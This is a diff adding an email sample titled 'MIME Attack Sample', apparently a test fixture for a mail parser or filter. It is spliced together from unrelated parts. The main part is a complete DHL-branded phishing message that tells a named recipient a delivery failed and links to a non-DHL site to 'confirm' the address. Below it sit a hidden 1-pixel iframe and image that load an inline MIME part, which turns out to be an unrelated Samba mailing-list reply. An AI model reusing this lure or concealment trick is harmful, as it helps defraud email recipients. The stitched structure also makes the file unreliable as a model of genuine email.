@@ -1,0 +1,90 @@
+From: tibi.codilean@ges.gla.ac.uk
+To: Freshrpms list <rpm-zzzlist@freshrpms.net>
+Subject: MIME Attack Sample
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+   <td colspan=3D"2" class=3D"readmsg">
+
+
+<h1><span style=3D"FONT-FAMILY: Tahoma">
+<div>
+<div class=3D"left"><a class=3D"aa" target=3D"_blank" title=3D"Home" href=
+=3D"http://spartanfinancials.com/DHL/index.php?email=3Djose@monkey.org"><im=
+g title=3D"DHL" alt=3D"DHL" src=3D"cid:dhllogo.gif" width=3D"134" height=3D=
+"42"></a></div></div></span></h1><span style=3D"FONT-FAMILY: Tahoma"><font =
+size=3D"2">
+<div>DELIVERY NOTIFICATION,<br><br>Dear jose, <br>We attempted to deliver y=
+our item at 10:10 AM on Jan 17, 2019.
+<br>The delivery attempt failed because nobody was present at the shipping =
+address, so this notification has been automatically sent.
+<br>If the parcel is not scheduled for redelivery or picked up within 72 ho=
+urs, it will be returned to the sender.
+<div><br>
+Label Number: DHL7567351D
+<div>
+Expected Delivery Date: Jan 17, 2019
+<div>Recipient Email: jose@monkey.org
+<br>=20
+Class: Package Services
+<div>
+Service(s): Delivery Confirmation
+<div>
+Status: eNotification sent=20
+<div>
+<br><a class=3D"aa" target=3D"_blank" href=3D"http://spartanfinancials.com/=
+DHL/index.php?email=3Djose@monkey.org">Click Here To Confirm Shipping Addre=
+ss </a><br><br>Thank You For Helping Us Serve You.</div>
+<div>
+<div><span>2019 =A9 DHL Customer Service. All rights reserved.</span></div>=
+</div></font></span>
+</td>
+------=_NextPart_000_0012_0306C35E.4C3C881D
+Content-Type: image/gif; name="dhllogo.gif"
+Content-Transfer-Encoding: base64
+Content-ID: <dhllogo.gif>
+
+R0lGODlhhgAqAKIAANkzAM8NAPmyAN9NAOlyAPKZAMwAAP/MACH5BAAAAAAALAAAAACGACoA
+AAP/eLrc/jDKSau9OOvNu/9gKI5kaZ5oqq5s675wLM90bd94ru987//AoFA4MBiPyKTyGBgI
+IIQl8qkoSI9UwNVI6Fm34GSAyhAEtl2FGa2IbgG9dXhuDDi0V/gCL9XLpWM9fHRzBQxFV4EK
+iIBPAoNLhjyMhHNpB19XZJlSVJRLAz4Fo6SlpqduUml/SwAErwRnV2mpfUMHAgQAu7y9DJBI
+isCVSH6yjbefSXoHtUqSysRMWWCSQs5iVKxJoZjSV9Bg3ULbSdbRRsbfS2mcrWRBw0fjVaej
+2vb5+qQLAvsF8FjkgkWwYMED6Jj0WtiLii6GvhY8hLhrD8WLELsY3PiKgIKASgD8reNWpVo/
+k81GTvtoyeM/UwLKSesmc16/Y6DUqDwC8GUpCu62hJJHKMAlogaYHUDKLOjMpYQuRfDn8wk2
+YiElblGUMhGZmnRCUvUJEOicMU7DOimDEhcYqbgG4CwqshLcW3jz6t3Lt6/fv4ADCx5MuLDh
+w4gTK17MWEgCADs=
+
+------=_NextPart_000_0012_0306C35E.4C3C881D--
+
+Content-Type: text/html
+<iframe width="1" height="25" src="cid:target" frameborder="0"></iframe><img    width="1" height="1"  src="cid:target">
+--BOUNDARY
+Content-ID: <target>
+Content-Type: text/plain
+BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+ninjabytes wrote:
+
+> is it possible to tell winbind to give each user a Kerberos ticket rather
+> than having everyone issuing the kinit command?
+
+"winbind refresh tickets = yes" in smb.conf
+and the add the krb5_auth option in the pam config.
+
+
+
+
+
+
+jerry
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFGcpYmIR7qMdg1EfYRApkjAKDMtJ9OkbPUl3d/7v/vmCOuwRwH9QCeOTzd
+pGEFuYdiFe6VIhv6oqQu9ig=
+=xRB2
+-----END PGP SIGNATURE-----
+
